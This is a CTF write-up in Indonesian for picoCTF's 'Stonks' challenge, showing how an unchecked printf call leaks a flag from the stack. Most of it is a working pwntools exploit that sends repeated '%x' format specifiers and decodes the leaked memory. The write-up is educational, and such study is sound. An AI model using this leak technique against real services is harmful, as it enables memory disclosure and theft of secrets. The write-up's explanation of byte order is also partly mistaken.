## Challenge Name: Stonks
>Category: Binary Exploitation

>Points: 20

>Solves: 21k+

Challenge Description: 
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c) ```nc mercury.picoctf.net 59616```

Artifact Files:
* [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c)

### Approach

**1. Analisis File?**

Coba kita lihat file vuln.c yang sudah didownload. Ini kode c dimana kita perlu menerima input dan program menghasilkan output. Karena ini challenge Binary Exploitation dengan poin rendah, kemungkinan celahnya masih basic. Dugaan pertama adalah buffer overflow. Ada beberapa fungsi vulnerable yang digunakan untuk input:
```
fgets(api_buf, FLAG_BUFFER, f);
```
Untuk fungsi ini kemungkinan overflow hilang karena ada limit dari FLAG_BUFFER
```
scanf("%300s", user_buf);
```
Untuk fungsi ini peluang juga hilang karena stringnya dilimit 300 karakter.
```
scanf("%d", &resp);
```
Fungsi ini tidak menerima string jadi tidak bisa menggunakan trik buffer overflow.

Sepertinya ini bukan buffer overflow deh. Coba kita lihat hint:
```
Okay, maybe I'd believe you if you find my API key.
```
Hmm..ada sesuatu di bagian yang berhubungan dengan API key. Mari kita lihat.
```
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```
Sepertinya celahnya ada di bagian ini. Program membaca data dari file ```api``` dan disimpan di buffer bernama ```api_buf```. Lalu program menerima input untuk API key, menampilkan API key yang diinput, dan mencetak portofolio. Sekilas tidak ada yang aneh.

Eh tunggu, kenapa habis diinput perlu diprint hasil inputnya? kan udah ada di awal secara ini pake ```scanf``` jadi ngapain diprint 2 kali?? Sepertinya ini celah sesungguhnya. Tapi apa ya?

Setelah melakukan searching, ku menemukan website yang membahas [ini](https://security.stackexchange.com/questions/43574/how-is-printf-in-c-c-a-buffer-overflow-vulnerability) dan ternyata memang benar ```printf``` bisa menjadi medium untuk melancarkan serangan menggunakan ```Format String Vulnerability```. Jadi intinya, printf itu argumen pertamanya bisa berupa string format macam ```%x```. Karena ini hasil buffer input nya langsung diprint lewat ```printf```, kita bisa main main disini untuk nge-print sesuatu dari stack. Nah, cara kerja printf itu, bila ada string formatter, dia akan nge-```pop``` data dari stack. Kalau kita spam ```%x``` misal, kita bisa ngeluarin semua isi stack.

Terus apa hubungannya dengan mendapatkan flag?

Ingat, stack itu menerapkan prinsip LIFO (Last In First Out), artinya data yang terakhir di-```push``` akan menjadi yang pertama di-```pop```. Dengan kata lain, data yang di-```pop``` itu data yang lebih lama. 

Sekarang ingat lagi, data apa saja yang sudah pernah di-```push``` ke stack sebagai argumen?

Yak benar, alamat buffer file tempat API key berada. Sepertinya kita perlu spam print macam ```%x``` sampai kena alamat buffer file yang kemudian bakal terprint lah flagnya.

**2. Get the flag**
Karena kita tidak bisa langsung menggunakan %s dikarenakan value yg distack belum tentu buffer string, paling aman menggunakan %x yang ngeprint nilai hex nya. Berhubung nguli 1 1 cape nih ya, mending kita pake script aja buat ngerjainnya. Yang recommended sih pake library ```pwntools``` di Python. Untuk installnya bisa dengan:
```
python3 -m pip install --upgrade pwntools
```
Untuk mencoba pwntoolsnya kita bisa buat script sederhana untuk mencoba connect ke server dan mengirimkan input payload yakni %x sebanyak 1 buah
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x\n")

#tampilkan hasilnya
print(r.recvline())
```
Script ini akan menghubungkan kita ke server CTF, menerima buffer sampai ada kata '2) View my portfolio\n' yang mana ini menandakan ada prompt untuk input mau lihat porto atau beli stonk, lalu kita input '1\n' untuk beli stock. Alasan kita tambahkan newline (\n) ke input agar input kita terkirim karena scanf akan mengscan sampai ketemu newline atau spasi. Lalu tunggu hingga Prompt untuk input API token muncul, lalu masukkan payload kita. Terakhir, terima stream dari server sampai ketemu newline untuk memeriksa apakah script kita benar. 

Setelah kita coba:
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
XXX\pwn_test.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
XXX\pwn_test.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
XXX\pwn_test.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
XXX\pwn_test.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x\n")
b'Buying stonks with token:\n'
[*] Closed connection to mercury.picoctf.net port 59616
```
Nah masuk, tapi belum keprint. Coba kita tambahkan satu recvline lagi.
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x\n")

#skip line "Buying stonks with token:\n"
r.recvline()

#print hasil exploit
print(r.recvline())
```
Coba kita jalankan ulang
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
XXX\pwn_test.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
XXX\pwn_test.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
XXX\pwn_test.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
XXX\pwn_test.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x\n")
b'87d7350\n'
[*] Closed connection to mercury.picoctf.net port 59616
```
Nah mantap akhirnya binarynya keprint juga. Coba kalau kita print lebih banyak lagi isi stacknya. Untuk separatornya pake apa ya? Gimana kalo spasi aja?
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x %x\n")

#skip line "Buying stonks with token:\n"
r.recvline()

#print hasil exploit
print(r.recvline())
```
Coba kita run lagi
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
XXX\pwn_test.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
XXX\pwn_test.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
XXX\pwn_test.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
XXX\pwn_test.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x %x\n")
b'893e3f0\n'
[*] Closed connection to mercury.picoctf.net port 59616
```
Lah gak keprint dong. Apa karena dia ngirim responsenya kalo ketemu spasi bakal dikasih newline ya? Hmm..coba ganti yang lain, coba pake underscore(_)!
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x_%x\n")

#skip line "Buying stonks with token:\n"
r.recvline()

#print hasil exploit
print(r.recvline())
```
Coba kita kirimkan lagi:
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
XXX\pwn_test.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
XXX\pwn_test.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
XXX\pwn_test.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
XXX\pwn_test.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x_%x\n")
b'8c7b4b0_804b000\n'
[*] Closed connection to mercury.picoctf.net port 59616
```
Nah sip masuk. Terlihat ada dua nilai hex yang terkirim. Nah coba kita print paksa semua isi stacknya sampe jebol semua. Kita pake angka 100 kali ya. Semoga cukup ya.
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x" + "_%x"*100 + "\n")

#skip line "Buying stonks with token:\n"
r.recvline()

#print hasil exploit
print(r.recvline())
```
Mari kita run:
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
XXX\pwn_test.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
XXX\pwn_test.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
XXX\pwn_test.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
XXX\pwn_test.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x" + "_%x"*100 + "\n")
b'9bc0410_804b000_80489c3_f7f9dd80_ffffffff_1_9bbe160_f7fab110_f7f9ddc7_0_9bbf180_2_9bc03f0_9bc0410_6f636970_7b465443_306c5f49_345f7435_6d5f6c6c_306d5f79_5f79336e_38343136_34356562_ffb6007d_f7fd8af8_f7fab440_fbd6db00_1_0_f7e3ace9_f7fac0c0_f7f9d5c0_f7f9d000_ffb632d8_f7e2b68d_f7f9d5c0_8048eca_ffb632e4_0_f7fbff09_804b000_f7f9d000_f7f9de20_ffb63318_f7fc5d50_f7f9e890_fbd6db00_f7f9d000_804b000_ffb63318_8048c86_9bbe160_ffb63304_ffb63318_8048be9_f7f9d3fc_0_ffb633cc_ffb633c4_1_1_9bbe160_fbd6db00_ffb63330_0_0_f7de0fa1_f7f9d000_f7f9d000_0_f7de0fa1_1_ffb633c4_ffb633cc_ffb63354_1_0_f7f9d000_f7fc070a_f7fd8000_0_f7f9d000_0_0_d374c314_30c6504_0_0_0_1_8048630_0_f7fc5d50_f7fc0960_804b000_1_8048630_0_8048662_8048b85_\n'
[*] Closed connection to mercury.picoctf.net port 59616
```
Woah..sampe buffernya keputus duluan sebelum sampe 100 sepertinya wkwkw.. Tapi harusnya address flagnya ada di sini sih. Sekarang pertanyaannya gimana cara convert ini address biar berguna?

Hmm jadi inget yang challenge [transformation](../Reverse%20Engineering/Transformation.md), apa kita coba pake ```decode()``` ya?
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x" + "_%x"*100 + "\n")

#skip line "Buying stonks with token:\n"
r.recvline()

#dapetin hasil exploit
response = r.recvline()
#decode it
print(response.decode())
```
Coba kita run:
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
XXX\pwn_test.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
XXX\pwn_test.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
XXX\pwn_test.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
XXX\pwn_test.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x" + "_%x"*100 + "\n")
9427370_804b000_80489c3_f7f78d80_ffffffff_1_9425160_f7f86110_f7f78dc7_0_9426180_8_9427350_9427370_6f636970_7b465443_306c5f49_345f7435_6d5f6c6c_306d5f79_5f79336e_38343136_34356562_ff97007d_f7fb3af8_f7f86440_ced86800_1_0_f7e15ce9_f7f870c0_f7f785c0_f7f78000_ff979008_f7e0668d_f7f785c0_8048eca_ff979014_0_f7f9af09_804b000_f7f78000_f7f78e20_ff979048_f7fa0d50_f7f79890_ced86800_f7f78000_804b000_ff979048_8048c86_9425160_ff979034_ff979048_8048be9_f7f783fc_0_ff9790fc_ff9790f4_1_1_9425160_ced86800_ff979060_0_0_f7dbbfa1_f7f78000_f7f78000_0_f7dbbfa1_1_ff9790f4_ff9790fc_ff979084_1_0_f7f78000_f7f9b70a_f7fb3000_0_f7f78000_0_0_b40cb43a_2c52b22a_0_0_0_1_8048630_0_f7fa0d50_f7f9b960_804b000_1_8048630_0_8048662_8048b85_

[*] Closed connection to mercury.picoctf.net port 59616
```
Lah..napa malah jadi string biasa dah? oh iya kan sebelumnya pas masih binary usah ASCII ya. Eh tunggu, setelah [kubaca-baca](https://cplusplus.com/reference/cstdio/printf/) ternyata ```%x``` itu baca datanya per 4-byte. Jadi tiap 4 byte di stack akan di print.

Oke, jujur ini masih belum bisa menjawab cara mengkonversi data ini agar berguna gimana.

Ku merenung...

Merenung...

Merenung...

dan masih stuck.

Sampai suatu saat ku iseng cari-cari di internet soal ```Format String Vulnerability``` dan menemukan website [ini](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/). Kubaca halaman lain tentang binary exploitation untuk lebih memahami challeng ini dan menemukan halaman yang [menarik](https://ctf101.org/binary-exploitation/what-are-buffers/). 

Jadi ternyata, buffer itu bisa ditaruh di ```STACK```.

Yes, baru tahu ternyata.

Dan ternyata, di contohnya, array yang di-_declare_ konstan sizenya akan di-_declare_ sebagai buffer di stack.

Dan tebak array apa yang size nya dideclare konstan di challenge?

YES! ```api_buf```, alias buffer berisi flagnya.

Artinya, selama ini, isi buffer, yakni flagnya, sudah ada di response hex yang kita terima, tinggal kita decode saja.

Mengingat kita menggunakan ```%x``` yang mencetak tiap 4 byte, dan kita tahu di soal ini buffer char, tiap %x akan mencetak 4 karakter dari flag. Hal ini berarti, untuk menkonversi hexnya menjadi char, kita potong tiap 1 byte, lalu dikonversi ke ASCII, terakhir di-concat.

Mari kita coba!!
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x" + "_%x"*100 + "\n")

#skip line "Buying stonks with token:\n"
r.recvline()

#dapetin hasil exploit
response = r.recvline()
#decode it to string
decoded_response = response.decode()
#split menjadi chunk
chunks = decoded_response.split("_")
#convert each chunk, tapi harus convert lagi ke bytearray karena ada yg panjangnya gak 8
for chunk in chunks:
  if(chunk=='\n'):
    continue
  #pad hex string
  while(len(chunk)<8):
    chunk = '0' + chunk
  #konvert ke bytes array
  bytes = bytearray.fromhex(chunk)
  #print stringnya
  print("".join([chr(byte) for byte in bytes]),end='')
```
Jadi di kode ini, kita decode responsenya ke string, split separatornya ("_"), lalu untuk setiap string di chunk, kita validasi lagi. Jika stringnya newline, kita skip, jika panjang stringnya kurang dari 8, kita padding biar jadi 8 (biar pas 4 byte entar pas diconvert), lalu string yg panjangnya dah 8 ini diconvert jadi bytearray. Terakhir, tiap byte di bytearray diconvert jadi char unicode.

Mari kita coba!
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x" + "_%x"*100 + "\n")
        ;ó♦♦Ã÷ö­ÿÿÿÿ☺ ;Ñ`÷÷►÷ö­Ç     ;á♥    ;óP     ;ópocip{FTC0l_I4_t5m_ll0m_y_y3n841645ebÿ}÷úZø÷÷
                                                                                                   @ô^<☺÷à|é÷÷÷ö¥À÷ö ÿÜè÷ß÷ö♦
ÊÿÜô÷øÏ       ♦°÷ö ÷ö® ÿÝ(÷ù-P÷ö¸^<÷ö♦°ÿÝ♦       ;Ñ`ÿÝ¶ÿÝ♦é÷ö£üÿÝÜÿÝÔ☺☺     ;Ñ`ô^<ÿÝ@÷Úß¡÷ö ÷ö ÷Úß¡☺ÿÝÔÿÝÜÿÝd☺÷ö ÷ø×     
÷úP÷ö ´Ú^v.Þ↑f♦0÷ù-P÷øÙ♦°♦♦♦
[*] Closed connection to mercury.picoctf.net port 59616
```
Dari karakter yang tercetak terlihat sesuatu yang seperti flagnya yakni:
```
ocip{FTC0l_I4_t5m_ll0m_y_y3n841645ebÿ}
```
Namun tulisannya terbalik wkwkwk. Sebenarnya di titik ini flagnya udah ketemu, tapi lebih baik kita sekalian eksplorasi kenapa bisa begini. Kemungkinan sih karena transmisi via internet dilakukan via Big Endian, Tiap 4 byte yang terkirim, byte yang berada di address lebih besar akan dikirim terlebih dahulu. Akibatnya flagnya menjadi terbalik.

Untuk memperbaikinya, kita tinggal mereverse string tersebut tiap 4 byte.
```
import pwn

#connect ke server
r = pwn.connect('mercury.picoctf.net',59616)

#tunggu sampai prompt aksi kelar
r.recvuntil('2) View my portfolio\n')

#kirim input
r.send("1\n")

#tunggu sampai prompt API key muncul
r.recvuntil('What is your API token?\n')

#kirim payload
r.send("%x" + "_%x"*100 + "\n")

#skip line "Buying stonks with token:\n"
r.recvline()

#dapetin hasil exploit
response = r.recvline()
#decode it to string
decoded_response = response.decode()
#split menjadi chunk
chunks = decoded_response.split("_")
#convert each chunk, tapi harus convert lagi ke bytearray karena ada yg panjangnya gak 8
for chunk in chunks:
  if(chunk=='\n'):
    continue
  #pad hex string
  while(len(chunk)<8):
    chunk = '0' + chunk
  #konvert ke bytes array
  bytes = bytearray.fromhex(chunk)
  #print stringnya
  print("".join([chr(byte) for byte in reversed(bytes)]),end='')
```
Mari kita jalankan:
```
[x] Opening connection to mercury.picoctf.net on port 59616
[x] Opening connection to mercury.picoctf.net on port 59616: Trying 18.189.209.142
[+] Opening connection to mercury.picoctf.net on port 59616: Done
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('2) View my portfolio\n')
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil('What is your API token?\n')
c:\Users\Anugrah  Wiradhika F\Documents\CTF\pwn_test.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x" + "_%x"*100 + "\n")
ÐC°ÃÍò÷ÿÿÿÿ☺`!►¡ó÷ÇÍò÷1☺°CÐCpicoCTF{I_l05t_4ll_my_m0n3y_6148be54}ýÿøzö÷@¤ó÷zÁ↓☺éÜ÷À°ó÷ÀÅò÷Àò÷H☻ýÿ¦Û÷ÀÅò÷ÊT☻ýÿ     ïô÷°Àò÷ Îò÷☻ýÿPM
õ÷ò÷zÁ↓Àò÷°☻ýÿ`!t☻ýÿ☻ýÿéüÃò÷<♥ýÿ4♥ýÿ☺☺`!zÁ↓ ☻ýÿ¡ÿÖ÷Àò÷Àò÷¡ÿÖ÷☺4♥ýÿ<♥ýÿÄ☻ýÿ☺Àò÷
÷ô÷pö÷Àò÷►Ù▼¶_äá☺0PMõ÷`ùô÷°☺0b
[*] Closed connection to mercury.picoctf.net port 59616
```
Didapat flagnya yakni:
```
picoCTF{I_l05t_4ll_my_m0n3y_6148be54}
```

### Reflections
Permulaan yang cukup sulit untuk Binary Exploitation wkwkw, tapi lebih karena perlu memahami konsepnya membutuhkan waktu dan harus memperdalam ilmu arsitektur komputer. Neverthenless, lumayan bagus untuk belajar Binary Exploitation.
  

---
[Back to home](../Readme.md)